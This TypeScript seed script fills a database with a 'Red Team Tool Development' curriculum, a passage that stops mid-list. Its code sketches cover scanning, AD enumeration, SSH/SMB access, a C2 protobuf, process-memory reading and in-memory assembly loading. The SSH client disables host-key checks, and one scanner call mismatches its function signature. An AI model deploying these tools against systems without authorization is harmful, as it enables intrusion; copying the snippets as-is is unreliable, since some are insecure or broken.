import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');
const now = Date.now();

// Create the path
const insertPath = db.prepare(`
  INSERT INTO paths (name, description, icon, color, language, skills, start_hint, difficulty, estimated_weeks, schedule, created_at)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const pathResult = insertPath.run(
  'Red Team Tool Development',
  'A structured path for building expertise in malware development, C2 infrastructure, and post-exploitation tooling by reimplementing common tools from scratch. Philosophy: Reimplement, don\'t just use. Understanding comes from building.',
  'skull',
  'red',
  'C, C++, Rust, Go, C#, Python, Assembly',
  'Windows internals, process injection, credential access, Active Directory, network attacks, C2 development, evasion techniques, persistence mechanisms',
  'Start with Phase 0 language foundations. Complete at least beginner and intermediate projects for C, C++, and Python before moving to Phase 1.',
  'advanced',
  52,
  `## Weekly Schedule (52 weeks)

### Weeks 1-20: Language Foundations (Phase 0)
- Weeks 1-2: C Beginner projects
- Weeks 3-4: C++ Beginner projects
- Weeks 5-6: Python Beginner + Intermediate
- Weeks 7-8: Go Beginner + Intermediate
- Weeks 9-10: C# Beginner + Intermediate
- Weeks 11-12: C Intermediate
- Weeks 13-14: C++ Intermediate
- Weeks 15-16: Rust Beginner + Intermediate
- Weeks 17-18: Assembly basics
- Weeks 19-20: Advanced projects across languages

### Weeks 21-24: Process & Memory (Phase 1)
- Process enumeration, DLL enumeration
- Memory read/write, keylogger

### Weeks 25-28: Reconnaissance (Phase 1.5)
- Network discovery, port scanning
- SMB enumeration, DNS recon

### Weeks 29-32: Code Injection (Phase 2)
- DLL injection, shellcode injection
- Process hollowing, APC injection

### Weeks 33-36: Privilege Escalation (Phase 2.5)
- Service misconfigs, UAC bypass
- Token abuse, DLL hijacking

### Weeks 37-40: Credential Access & AD (Phases 3-4)
- SAM dumping, LSASS, DCSync
- Kerberoasting, AS-REP roasting

### Weeks 41-44: Network & Lateral Movement (Phases 4.5-5)
- LLMNR/NBT-NS, NTLM relay
- SMB/WMI/WinRM execution, PtH

### Weeks 45-48: C2 & Evasion (Phases 6-7)
- HTTP/DNS implants, traffic blending
- Packers, shellcode generators, anti-analysis

### Weeks 49-52: Persistence & Capstone (Phases 8-9)
- Registry, scheduled tasks, COM hijacking
- Complete 1-2 capstone projects`,
  now
);

const pathId = pathResult.lastInsertRowid;

const insertModule = db.prepare(`
  INSERT INTO modules (path_id, name, description, order_index, created_at)
  VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
  INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
  VALUES (?, ?, ?, ?, ?, ?)
`);

interface TaskData {
  title: string;
  description: string;
  details: string;
}

interface ModuleData {
  name: string;
  description: string;
  tasks: TaskData[];
}

const modules: ModuleData[] = [
  // Phase 0: Language Foundations
  {
    name: 'Phase 0: C Foundation',
    description: 'Build foundational C skills - direct memory control, minimal overhead, shellcode development',
    tasks: [
      { title: 'Memory Allocator', description: 'Implement malloc/free using mmap/VirtualAlloc', details: '## Overview\nImplement a simple memory allocator to understand heap management fundamentals.\n\n### Implementation\n- Use mmap (Linux) or VirtualAlloc (Windows) for raw memory\n- Track allocations in a linked list\n- Handle alignment requirements (8/16 byte boundaries)\n\n### Practice\n- [ ] Implement basic malloc/free\n- [ ] Add alignment support\n- [ ] Test with various allocation sizes\n\n### Completion Criteria\n- [ ] Can allocate and free memory correctly\n- [ ] No memory leaks in testing' },
      { title: 'String Library', description: 'Reimplement strlen, strcpy, strcmp, strstr without stdlib', details: '## Overview\nBuild string manipulation functions to master pointer arithmetic.\n\n### Implementation\n```c\nsize_t my_strlen(const char *s) {\n    const char *p = s;\n    while (*p) p++;\n    return p - s;\n}\n```\n\n### Practice\n- [ ] Implement all four functions\n- [ ] Handle NULL and empty string edge cases\n- [ ] Test against standard library versions' },
      { title: 'File Reader', description: 'Read binary file and parse format (PE/ELF header)', details: '## Overview\nLearn binary file handling and struct parsing.\n\n### Implementation\n- Read file into memory buffer\n- Parse DOS header (PE) or ELF header\n- Print parsed fields\n\n### Practice\n- [ ] Read arbitrary binary files\n- [ ] Parse and display header fields\n- [ ] Handle malformed files gracefully' },
      { title: 'Mini Shell', description: 'Fork/exec or CreateProcess with pipe handling', details: '## Overview\nBuild a minimal shell to understand process creation.\n\n### Implementation\n- CreateProcess (Windows) or fork/exec (Linux)\n- Handle pipes between commands\n- Implement cd, exit, pwd built-ins\n\n### Practice\n- [ ] Execute external commands\n- [ ] Implement pipe operator\n- [ ] Handle background processes' },
      { title: 'TCP Client/Server', description: 'Echo server with select/poll multiplexing', details: '## Overview\nNetwork programming fundamentals with concurrent connections.\n\n### Implementation\n- Create listening socket\n- Handle multiple clients with select()/poll()\n- Implement length-prefixed message protocol\n\n### Practice\n- [ ] Build echo server\n- [ ] Test with multiple concurrent clients\n- [ ] Implement graceful shutdown' },
      { title: 'PE Parser', description: 'Parse PE headers, list imports/exports, calculate entropy', details: '## Overview\nDeep dive into Windows executable format.\n\n### Implementation\n- Parse DOS header, NT headers, section headers\n- Walk import/export tables\n- Calculate Shannon entropy per section\n\n### Practice\n- [ ] Parse any Windows executable\n- [ ] Identify packed binaries (high entropy)\n- [ ] List all imported DLLs and functions' },
      { title: 'Position-Independent Code', description: 'Resolve kernel32 from PEB, call MessageBoxA dynamically', details: '## Overview\nFoundation for shellcode development - no hardcoded addresses.\n\n### Implementation\n- Find PEB from TEB (gs:[0x60] on x64)\n- Walk InMemoryOrderModuleList for kernel32\n- Parse export table to find LoadLibraryA/GetProcAddress\n\n### Practice\n- [ ] Print "Hello World" without imports\n- [ ] Resolve any API dynamically\n- [ ] Verify position-independence' },
      { title: 'Mini Debugger', description: 'Attach to process, set breakpoints, single-step', details: '## Overview\nUnderstand debugging internals.\n\n### Implementation\n- Use DebugActiveProcess/ptrace to attach\n- Set breakpoints (INT3 instruction)\n- Implement single-step and continue\n\n### Practice\n- [ ] Attach to running process\n- [ ] Set and hit breakpoints\n- [ ] Read/write registers and memory' }
    ]
  },
  {
    name: 'Phase 0: C++ Foundation',
    description: 'Windows API fluency, COM programming, RAII patterns',
    tasks: [
      { title: 'RAII Wrappers', description: 'Handle, File, Registry key auto-cleanup wrappers', details: '## Overview\nModern C++ resource management patterns.\n\n### Implementation\n```cpp\nclass HandleWrapper {\n    HANDLE h;\npublic:\n    HandleWrapper(HANDLE h) : h(h) {}\n    ~HandleWrapper() { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); }\n    operator HANDLE() { return h; }\n};\n```\n\n### Practice\n- [ ] Create Handle wrapper\n- [ ] Create File wrapper with read/write\n- [ ] Create Registry key wrapper' },
      { title: 'Windows Service Monitor', description: 'List services using SCManager API', details: '## Overview\nEnumerate Windows services programmatically.\n\n### Implementation\n- OpenSCManager for read access\n- EnumServicesStatusEx for all services\n- Display name, status, PID, start type\n\n### Practice\n- [ ] List all services\n- [ ] Filter by running/stopped\n- [ ] Display service dependencies' },
      { title: 'Directory Walker', description: 'Recursive directory enumeration with filters', details: '## Overview\nFile system traversal with FindFirstFile/FindNextFile.\n\n### Practice\n- [ ] Enumerate directories recursively\n- [ ] Calculate total size and file count\n- [ ] Support extension/size/date filters' },
      { title: 'Registry Toolkit', description: 'Read/write all registry types, export, search', details: '## Overview\nComplete registry manipulation tool.\n\n### Practice\n- [ ] Read/write all value types\n- [ ] Export key to file\n- [ ] Search by name or data' },
      { title: 'Event Log Reader', description: 'Read/filter Windows Event Log entries', details: '## Overview\nWindows event log analysis.\n\n### Practice\n- [ ] Read event log entries\n- [ ] Filter by source, event ID, time\n- [ ] Output as JSON' },
      { title: 'COM Client', description: 'Use ITaskScheduler and IWbemServices', details: '## Overview\nComponent Object Model basics.\n\n### Practice\n- [ ] List scheduled tasks via COM\n- [ ] Query WMI Win32_Process\n- [ ] Proper COM init/cleanup' },
      { title: 'DLL with Exports', description: 'Create DLL with exports, DllMain, TLS callbacks', details: '## Overview\nDLL internals and loading.\n\n### Practice\n- [ ] Create DLL with multiple exports\n- [ ] Implement DllMain handlers\n- [ ] Add TLS callbacks' },
      { title: 'Hook Library', description: 'Inline hooking with trampolines', details: '## Overview\nAPI hooking techniques.\n\n### Practice\n- [ ] Implement inline hook (JMP)\n- [ ] Hook MessageBoxA\n- [ ] Support clean unhooking' }
    ]
  },
  {
    name: 'Phase 0: Rust Foundation',
    description: 'Memory safety, small binaries, cross-compilation',
    tasks: [
      { title: 'CLI Argument Parser', description: 'Parse flags, options, positional args without crates', details: '## Overview\nLearn Rust basics through argument parsing.\n\n### Practice\n- [ ] Parse flags, options, positionals\n- [ ] Generate help text\n- [ ] Handle errors gracefully' },
      { title: 'File Hasher', description: 'Calculate MD5, SHA1, SHA256 of files', details: '## Overview\nCrypto and file I/O in Rust.\n\n### Practice\n- [ ] Support multiple hash algorithms\n- [ ] Recursive directory hashing\n- [ ] Output in hashcat/john format' },
      { title: 'JSON Config Parser', description: 'Strongly typed config with serde', details: '## Overview\nLearn Rust\'s powerful serde ecosystem for strongly-typed configuration parsing.\n\n### Implementation\n```rust\nuse serde::{Deserialize, Serialize};\n\n#[derive(Debug, Deserialize, Serialize)]\nstruct Config {\n    #[serde(default = "default_port")]\n    port: u16,\n    host: String,\n    #[serde(skip_serializing_if = "Option::is_none")]\n    timeout: Option<u64>,\n}\n\nfn default_port() -> u16 { 8080 }\n```\n\n### Key Concepts\n- Derive macros for automatic serialization\n- Default values and optional fields\n- Custom validation with serde attributes\n- Error handling with Result types\n\n### Practice\n- [ ] Parse JSON config to typed struct\n- [ ] Implement default values and validation\n- [ ] Handle missing/malformed fields gracefully\n- [ ] Write comprehensive tests\n\n### Completion Criteria\n- [ ] Config parses correctly from file\n- [ ] Validation errors are clear and actionable\n- [ ] Missing fields use sensible defaults' },
      { title: 'HTTP Client', description: 'GET/POST using std::net (no reqwest)', details: '## Overview\nHTTP protocol implementation.\n\n### Practice\n- [ ] Manual HTTP request building\n- [ ] Parse responses\n- [ ] Handle chunked encoding' },
      { title: 'Windows API Bindings', description: 'Use windows-rs for process enumeration', details: '## Overview\nLearn to call Windows APIs safely from Rust using the official windows-rs crate.\n\n### Implementation\n```rust\nuse windows::Win32::System::Diagnostics::ToolHelp::*;\nuse windows::Win32::Foundation::*;\n\nfn enumerate_processes() -> windows::core::Result<Vec<u32>> {\n    unsafe {\n        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;\n        let mut entry = PROCESSENTRY32W::default();\n        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;\n        // Walk the process list...\n    }\n}\n```\n\n### Key Concepts\n- windows-rs crate for safe Windows API bindings\n- Proper error handling with windows::core::Result\n- Unsafe blocks for FFI calls\n- Token manipulation and privilege queries\n\n### Practice\n- [ ] Enumerate processes with CreateToolhelp32Snapshot\n- [ ] Open and query current user token\n- [ ] List enabled/disabled privileges\n- [ ] Handle access denied gracefully\n\n### Completion Criteria\n- [ ] List all running processes with PIDs\n- [ ] Display current user privileges\n- [ ] Code handles errors without panicking' },
      { title: 'Async TCP Server', description: 'Tokio-based concurrent server', details: '## Overview\nBuild a concurrent TCP server using Tokio async runtime - foundation for C2 implants.\n\n### Implementation\n```rust\nuse tokio::net::TcpListener;\nuse tokio::io::{AsyncReadExt, AsyncWriteExt};\n\n#[tokio::main]\nasync fn main() -> Result<(), Box<dyn std::error::Error>> {\n    let listener = TcpListener::bind("127.0.0.1:8080").await?;\n    loop {\n        let (mut socket, addr) = listener.accept().await?;\n        tokio::spawn(async move {\n            let mut buf = [0u8; 1024];\n            // Handle connection...\n        });\n    }\n}\n```\n\n### Key Concepts\n- Tokio runtime and async/await patterns\n- Spawning tasks for concurrent connections\n- Graceful shutdown with tokio::select!\n- Length-prefixed protocols for message framing\n\n### Practice\n- [ ] Accept and handle multiple concurrent connections\n- [ ] Implement JSON-based command protocol\n- [ ] Add graceful shutdown handling\n- [ ] Test with concurrent client connections\n\n### Completion Criteria\n- [ ] Server handles 100+ concurrent connections\n- [ ] Commands are parsed and executed correctly\n- [ ] Clean shutdown preserves state' },
      { title: 'In-Memory PE Loader', description: 'Load PE from bytes, fix relocations', details: '## Overview\nAdvanced PE manipulation.\n\n### Practice\n- [ ] Map sections correctly\n- [ ] Fix relocations\n- [ ] Resolve imports' },
      { title: 'Encrypted Channel', description: 'DH key exchange, AES-256-GCM', details: '## Overview\nImplement secure communications with forward secrecy using Diffie-Hellman and AES-GCM.\n\n### Implementation\n```rust\nuse x25519_dalek::{EphemeralSecret, PublicKey};\nuse aes_gcm::{Aes256Gcm, Key, Nonce};\nuse aes_gcm::aead::{Aead, NewAead};\n\n// Key exchange\nlet secret = EphemeralSecret::new(rand::thread_rng());\nlet public = PublicKey::from(&secret);\n// Exchange publics, compute shared secret\nlet shared = secret.diffie_hellman(&peer_public);\n```\n\n### Key Concepts\n- X25519 Diffie-Hellman for key agreement\n- AES-256-GCM authenticated encryption\n- Nonce generation and management\n- Replay protection with sequence numbers\n\n### Practice\n- [ ] Implement X25519 key exchange\n- [ ] Derive AES key from shared secret (HKDF)\n- [ ] Encrypt/decrypt messages with AES-GCM\n- [ ] Add sequence numbers for replay protection\n\n### Completion Criteria\n- [ ] Secure channel established between peers\n- [ ] Messages encrypted with unique nonces\n- [ ] Replay attacks detected and rejected' }
    ]
  },
  {
    name: 'Phase 0: Go Foundation',
    description: 'Fast development, concurrency, cross-compilation',
    tasks: [
      { title: 'Port Scanner', description: 'Concurrent TCP scanner with banner grabbing', details: '## Overview\nBuild a fast concurrent port scanner leveraging Go\'s goroutines and channels.\n\n### Implementation\n```go\nfunc scanPort(host string, port int, results chan<- int) {\n    addr := fmt.Sprintf("%s:%d", host, port)\n    conn, err := net.DialTimeout("tcp", addr, 2*time.Second)\n    if err == nil {\n        conn.Close()\n        results <- port\n    }\n}\n\n// Launch workers with semaphore for concurrency control\nsem := make(chan struct{}, 100)\nfor port := 1; port <= 65535; port++ {\n    sem <- struct{}{}\n    go func(p int) { defer func() { <-sem }(); scanPort(host, p) }(port)\n}\n```\n\n### Key Concepts\n- Goroutines for concurrent scanning\n- Channels for result collection\n- Semaphore pattern for concurrency limits\n- TCP banner grabbing techniques\n\n### Practice\n- [ ] Implement basic TCP connect scan\n- [ ] Add concurrent goroutines with limit\n- [ ] Grab service banners on open ports\n- [ ] Support port ranges and common ports\n\n### Completion Criteria\n- [ ] Scan 65535 ports in under 30 seconds\n- [ ] Correctly identify open ports\n- [ ] Display service banners when available' },
      { title: 'File Server', description: 'HTTP static file server with auth', details: '## Overview\nBuild an HTTP file server with authentication - useful for payload staging and exfiltration.\n\n### Implementation\n```go\nfunc basicAuth(next http.Handler, user, pass string) http.Handler {\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        u, p, ok := r.BasicAuth()\n        if !ok || u != user || p != pass {\n            w.Header().Set("WWW-Authenticate", `Basic realm="restricted"`)\n            http.Error(w, "Unauthorized", http.StatusUnauthorized)\n            return\n        }\n        next.ServeHTTP(w, r)\n    })\n}\n```\n\n### Key Concepts\n- net/http for HTTP server\n- http.FileServer for static files\n- Basic authentication middleware\n- Directory traversal prevention\n\n### Practice\n- [ ] Serve files from directory\n- [ ] Add directory listing with HTML\n- [ ] Implement basic authentication\n- [ ] Add upload endpoint\n\n### Completion Criteria\n- [ ] Files served correctly\n- [ ] Auth required for all endpoints\n- [ ] No directory traversal vulnerabilities' },
      { title: 'Log Parser', description: 'Parse Apache/nginx/auth logs', details: '## Overview\nBuild a log analysis tool for identifying attack patterns and extracting IOCs.\n\n### Implementation\n```go\ntype LogEntry struct {\n    IP        string\n    Timestamp time.Time\n    Method    string\n    Path      string\n    Status    int\n}\n\nvar apacheRegex = regexp.MustCompile(\n    `^(\\S+) \\S+ \\S+ \\[([^\\]]+)\\] \"(\\S+) (\\S+).*\" (\\d+)`)\n\nfunc parseLine(line string) (*LogEntry, error) {\n    matches := apacheRegex.FindStringSubmatch(line)\n    // Parse fields...\n}\n```\n\n### Key Concepts\n- Regular expressions for log parsing\n- Time parsing with custom layouts\n- Aggregation and statistics\n- Streaming large files efficiently\n\n### Practice\n- [ ] Parse Apache/nginx combined log format\n- [ ] Extract IPs, timestamps, paths, status codes\n- [ ] Generate statistical summaries\n- [ ] Filter by IP, time range, status\n\n### Completion Criteria\n- [ ] Parse multi-GB log files efficiently\n- [ ] Identify top IPs and suspicious patterns\n- [ ] Export results in JSON/CSV' },
      { title: 'Reverse Proxy', description: 'HTTP proxy with header manipulation', details: '## Overview\nBuild a reverse proxy for traffic interception and header manipulation.\n\n### Implementation\n```go\nfunc proxyHandler(target *url.URL) http.Handler {\n    proxy := httputil.NewSingleHostReverseProxy(target)\n    originalDirector := proxy.Director\n    proxy.Director = func(r *http.Request) {\n        originalDirector(r)\n        r.Header.Set("X-Forwarded-Host", r.Host)\n        // Modify headers as needed\n    }\n    proxy.ModifyResponse = func(r *http.Response) error {\n        // Log or modify response\n        return nil\n    }\n    return proxy\n}\n```\n\n### Key Concepts\n- httputil.ReverseProxy for proxying\n- Director for request modification\n- ModifyResponse for response interception\n- TLS termination and re-encryption\n\n### Practice\n- [ ] Forward requests to backend\n- [ ] Modify request/response headers\n- [ ] Log all traffic for analysis\n- [ ] Handle WebSocket upgrades\n\n### Completion Criteria\n- [ ] Proxy works transparently\n- [ ] Headers injected correctly\n- [ ] Full request/response logging' },
      { title: 'LDAP Client', description: 'Connect, bind, search LDAP', details: '## Overview\nBuild an LDAP client for Active Directory enumeration and reconnaissance.\n\n### Implementation\n```go\nimport "github.com/go-ldap/ldap/v3"\n\nfunc queryAD(server, user, pass, baseDN string) error {\n    conn, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", server))\n    if err != nil { return err }\n    defer conn.Close()\n    \n    err = conn.Bind(user, pass)\n    if err != nil { return err }\n    \n    searchReq := ldap.NewSearchRequest(\n        baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,\n        "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",\n        []string{"cn", "sAMAccountName", "memberOf"}, nil)\n    // Execute search...\n}\n```\n\n### Key Concepts\n- LDAP protocol and bind operations\n- LDAP search filters syntax\n- Active Directory schema attributes\n- Paged results for large directories\n\n### Practice\n- [ ] Connect and bind to LDAP\n- [ ] Search with complex filters\n- [ ] Enumerate users, groups, computers\n- [ ] Extract group memberships\n\n### Completion Criteria\n- [ ] Successfully query Active Directory\n- [ ] Parse and display results clearly\n- [ ] Handle large result sets with paging' },
      { title: 'SSH Client Library', description: 'Connect, execute commands, interactive shell', details: '## Overview\nBuild an SSH client for remote command execution and lateral movement.\n\n### Implementation\n```go\nimport "golang.org/x/crypto/ssh"\n\nfunc sshConnect(host, user, password string) (*ssh.Client, error) {\n    config := &ssh.ClientConfig{\n        User: user,\n        Auth: []ssh.AuthMethod{ssh.Password(password)},\n        HostKeyCallback: ssh.InsecureIgnoreHostKey(),\n    }\n    return ssh.Dial("tcp", host+":22", config)\n}\n\nfunc execCommand(client *ssh.Client, cmd string) (string, error) {\n    session, err := client.NewSession()\n    if err != nil { return "", err }\n    defer session.Close()\n    output, err := session.CombinedOutput(cmd)\n    return string(output), err\n}\n```\n\n### Key Concepts\n- SSH protocol and authentication methods\n- Session management and command execution\n- PTY allocation for interactive shells\n- Key-based authentication\n\n### Practice\n- [ ] Connect with password and key auth\n- [ ] Execute remote commands\n- [ ] Create interactive PTY session\n- [ ] Forward ports through SSH\n\n### Completion Criteria\n- [ ] Connect to SSH servers reliably\n- [ ] Execute commands and capture output\n- [ ] Interactive shell works correctly' },
      { title: 'SMB Client', description: 'Connect, list, upload, download', details: '## Overview\nBuild an SMB client for file operations and share enumeration.\n\n### Implementation\n```go\nimport "github.com/hirochachacha/go-smb2"\n\nfunc connectSMB(host, user, pass, domain string) (*smb2.Session, error) {\n    conn, err := net.Dial("tcp", host+":445")\n    if err != nil { return nil, err }\n    \n    d := &smb2.Dialer{\n        Initiator: &smb2.NTLMInitiator{\n            User:     user,\n            Password: pass,\n            Domain:   domain,\n        },\n    }\n    return d.Dial(conn)\n}\n```\n\n### Key Concepts\n- SMB2/3 protocol basics\n- NTLM authentication\n- Share enumeration and access\n- File read/write operations\n\n### Practice\n- [ ] Connect to SMB shares\n- [ ] List share contents\n- [ ] Upload and download files\n- [ ] Enumerate available shares\n\n### Completion Criteria\n- [ ] Connect with domain credentials\n- [ ] Full file operations working\n- [ ] Handle access denied gracefully' },
      { title: 'gRPC Command Server', description: 'Protobuf commands with bidirectional streaming', details: '## Overview\nBuild a gRPC-based C2 server with bidirectional streaming for real-time command/response.\n\n### Implementation\n```protobuf\nservice Commander {\n    rpc CommandStream(stream AgentMessage) returns (stream ServerMessage);\n}\nmessage AgentMessage {\n    string agent_id = 1;\n    oneof payload {\n        Heartbeat heartbeat = 2;\n        CommandResult result = 3;\n    }\n}\nmessage ServerMessage {\n    oneof payload {\n        Command command = 1;\n        Config config = 2;\n    }\n}\n```\n\n### Key Concepts\n- Protocol Buffers for serialization\n- Bidirectional streaming RPCs\n- Connection management and heartbeats\n- Command queuing and result handling\n\n### Practice\n- [ ] Define protobuf service and messages\n- [ ] Implement streaming server\n- [ ] Queue commands per agent\n- [ ] Handle reconnections gracefully\n\n### Completion Criteria\n- [ ] Bidirectional streaming works\n- [ ] Commands queued and delivered\n- [ ] Results captured and stored' }
    ]
  },
  {
    name: 'Phase 0: C# Foundation',
    description: '.NET runtime, reflection, P/Invoke for post-ex',
    tasks: [
      { title: 'System Info Gatherer', description: 'Hostname, IP, OS, installed software', details: '## Overview\nGather comprehensive system information for situational awareness during post-exploitation.\n\n### Implementation\n```csharp\nusing System;\nusing System.Net;\nusing Microsoft.Win32;\n\npublic static class SysInfo {\n    public static void Gather() {\n        Console.WriteLine($"Hostname: {Environment.MachineName}");\n        Console.WriteLine($"User: {Environment.UserDomainName}\\\\{Environment.UserName}");\n        Console.WriteLine($"OS: {Environment.OSVersion}");\n        Console.WriteLine($"x64: {Environment.Is64BitOperatingSystem}");\n        \n        // IP addresses\n        foreach (var ip in Dns.GetHostAddresses(Dns.GetHostName()))\n            Console.WriteLine($"IP: {ip}");\n    }\n}\n```\n\n### Key Concepts\n- System.Environment for basic info\n- Registry for installed software\n- WMI for detailed hardware/software\n- Network configuration enumeration\n\n### Practice\n- [ ] Gather hostname, user, domain\n- [ ] Enumerate IP addresses\n- [ ] List installed software from registry\n- [ ] Query WMI for additional details\n\n### Completion Criteria\n- [ ] Complete system profile generated\n- [ ] Output in structured format\n- [ ] No admin rights required for basics' },
      { title: 'Process Manager', description: 'List, kill, show modules per process', details: '## Overview\nBuild a process management tool for enumeration and manipulation.\n\n### Implementation\n```csharp\nusing System.Diagnostics;\n\npublic static void ListProcesses() {\n    foreach (var proc in Process.GetProcesses()) {\n        try {\n            Console.WriteLine($"{proc.Id,-8} {proc.ProcessName,-30} {proc.MainModule?.FileName}");\n        } catch (Exception) {\n            Console.WriteLine($"{proc.Id,-8} {proc.ProcessName,-30} [Access Denied]");\n        }\n    }\n}\n\npublic static void ListModules(int pid) {\n    var proc = Process.GetProcessById(pid);\n    foreach (ProcessModule mod in proc.Modules)\n        Console.WriteLine($"  {mod.ModuleName}: {mod.FileName}");\n}\n```\n\n### Key Concepts\n- System.Diagnostics.Process class\n- ProcessModule enumeration\n- Access control and permissions\n- Process termination safely\n\n### Practice\n- [ ] List all processes with details\n- [ ] Kill process by PID or name\n- [ ] Enumerate loaded modules\n- [ ] Show parent-child relationships\n\n### Completion Criteria\n- [ ] Full process listing working\n- [ ] Module enumeration for accessible processes\n- [ ] Graceful handling of access denied' },
      { title: 'File Encryptor', description: 'AES encrypt/decrypt with PBKDF2', details: '## Overview\nImplement secure file encryption using AES and proper key derivation.\n\n### Implementation\n```csharp\nusing System.Security.Cryptography;\n\npublic static byte[] Encrypt(byte[] data, string password) {\n    using var aes = Aes.Create();\n    aes.GenerateIV();\n    \n    // Derive key from password\n    using var kdf = new Rfc2898DeriveBytes(password, aes.IV, 100000, HashAlgorithmName.SHA256);\n    aes.Key = kdf.GetBytes(32);\n    \n    using var encryptor = aes.CreateEncryptor();\n    var encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);\n    \n    // Prepend IV to ciphertext\n    return aes.IV.Concat(encrypted).ToArray();\n}\n```\n\n### Key Concepts\n- AES-256 symmetric encryption\n- PBKDF2 for key derivation\n- IV generation and handling\n- Authenticated encryption (GCM mode)\n\n### Practice\n- [ ] Implement AES encryption/decryption\n- [ ] Derive keys from passwords with PBKDF2\n- [ ] Generate random IVs securely\n- [ ] Add file streaming for large files\n\n### Completion Criteria\n- [ ] Files encrypt/decrypt correctly\n- [ ] Keys derived securely\n- [ ] No IV reuse vulnerabilities' },
      { title: 'WMI Explorer', description: 'Query any WMI class, event subscriptions', details: '## Overview\nBuild a WMI query tool for system enumeration and event subscriptions.\n\n### Implementation\n```csharp\nusing System.Management;\n\npublic static void QueryWMI(string wql) {\n    using var searcher = new ManagementObjectSearcher(wql);\n    foreach (ManagementObject obj in searcher.Get()) {\n        foreach (var prop in obj.Properties)\n            Console.WriteLine($"  {prop.Name}: {prop.Value}");\n        Console.WriteLine();\n    }\n}\n\n// Example: QueryWMI("SELECT * FROM Win32_Process");\n// Example: QueryWMI("SELECT * FROM Win32_Service");\n```\n\n### Key Concepts\n- WMI architecture and namespaces\n- WQL query language\n- Event subscriptions for monitoring\n- Remote WMI connections\n\n### Practice\n- [ ] Query processes, services, users\n- [ ] Execute arbitrary WQL queries\n- [ ] Create event subscriptions\n- [ ] Connect to remote machines\n\n### Completion Criteria\n- [ ] Query any WMI class\n- [ ] Event subscriptions working\n- [ ] Results formatted clearly' },
      { title: 'AD Query Tool', description: 'Search users, groups, computers', details: '## Overview\nQuery Active Directory for users, groups, and computers using DirectoryServices.\n\n### Implementation\n```csharp\nusing System.DirectoryServices;\n\npublic static void FindUsers(string domain, string filter) {\n    using var entry = new DirectoryEntry($"LDAP://{domain}");\n    using var searcher = new DirectorySearcher(entry) {\n        Filter = $"(&(objectClass=user){filter})",\n        PropertiesToLoad = { "cn", "sAMAccountName", "memberOf", "lastLogon" }\n    };\n    \n    foreach (SearchResult result in searcher.FindAll()) {\n        Console.WriteLine($"User: {result.Properties[\"sAMAccountName\"][0]}");\n        foreach (var group in result.Properties["memberOf"])\n            Console.WriteLine($"  Member of: {group}");\n    }\n}\n```\n\n### Key Concepts\n- DirectoryEntry and DirectorySearcher\n- LDAP filter syntax\n- Property loading optimization\n- Paged results for large domains\n\n### Practice\n- [ ] Enumerate domain users\n- [ ] Find group memberships\n- [ ] Search computers and DCs\n- [ ] Find privileged accounts\n\n### Completion Criteria\n- [ ] Query users, groups, computers\n- [ ] Display group memberships\n- [ ] Handle large AD environments' },
      { title: 'P/Invoke Workshop', description: 'Call Windows APIs, proper marshaling', details: '## Overview\nMaster P/Invoke to call native Windows APIs from managed C# code.\n\n### Implementation\n```csharp\nusing System.Runtime.InteropServices;\n\n[DllImport("kernel32.dll", SetLastError = true)]\nstatic extern IntPtr OpenProcess(uint access, bool inherit, int pid);\n\n[DllImport("kernel32.dll", SetLastError = true)]\nstatic extern bool ReadProcessMemory(\n    IntPtr hProcess, IntPtr lpBaseAddress,\n    [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);\n\nconst uint PROCESS_VM_READ = 0x0010;\nconst uint PROCESS_QUERY_INFORMATION = 0x0400;\n\npublic static byte[] ReadMemory(int pid, IntPtr address, int size) {\n    var handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);\n    var buffer = new byte[size];\n    ReadProcessMemory(handle, address, buffer, size, out _);\n    return buffer;\n}\n```\n\n### Key Concepts\n- DllImport attribute and calling conventions\n- Marshaling structs and arrays\n- Handle management and cleanup\n- Error handling with GetLastError\n\n### Practice\n- [ ] Call basic Win32 APIs\n- [ ] Marshal complex structs\n- [ ] Implement OpenProcess/ReadProcessMemory\n- [ ] Handle errors properly\n\n### Completion Criteria\n- [ ] P/Invoke calls work correctly\n- [ ] Structs marshaled properly\n- [ ] Memory read from other processes' },
      { title: 'Assembly Loader', description: 'Load .NET from bytes, invoke via reflection', details: '## Overview\nLoad and execute .NET assemblies from memory - core technique for in-memory execution.\n\n### Implementation\n```csharp\nusing System.Reflection;\nusing System.IO;\n\npublic static void ExecuteAssembly(byte[] assemblyBytes, string[] args) {\n    // Redirect console output\n    var originalOut = Console.Out;\n    var sw = new StringWriter();\n    Console.SetOut(sw);\n    \n    try {\n        var assembly = Assembly.Load(assemblyBytes);\n        var entryPoint = assembly.EntryPoint;\n        \n        // Handle Main(string[] args) or Main()\n        var parameters = entryPoint.GetParameters();\n        if (parameters.Length > 0)\n            entryPoint.Invoke(null, new object[] { args });\n        else\n            entryPoint.Invoke(null, null);\n    } finally {\n        Console.SetOut(originalOut);\n    }\n    \n    Console.WriteLine(sw.ToString());\n}\n```\n\n### Key Concepts\n- Assembly.Load for in-memory loading\n- Reflection for method invocation\n- Console output redirection\n- AppDomain isolation (optional)\n\n### Practice\n- [ ] Load assembly from byte array\n- [ ] Find and invoke entry point\n- [ ] Capture console output\n- [ ] Pass arguments correctly\n\n### Completion Criteria\n- [ ] Assemblies execute from memory\n- [ ] Output captured and returned\n- [ ] Errors handled gracefully' },
